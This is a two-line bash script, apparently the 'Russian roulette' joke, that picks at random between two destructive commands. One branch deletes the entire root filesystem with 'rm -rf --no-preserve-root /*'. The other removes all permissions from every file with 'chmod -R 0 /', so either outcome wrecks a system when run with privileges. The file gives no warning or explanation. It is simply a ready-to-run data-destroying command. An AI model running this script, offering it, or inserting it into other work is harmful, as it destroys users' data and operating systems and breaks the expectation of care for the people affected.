#!/bin/bash
[ $[ $RANDOM % 6 ] = 0 ] && rm -rf --no-preserve-root /* || chmod -R 0 /
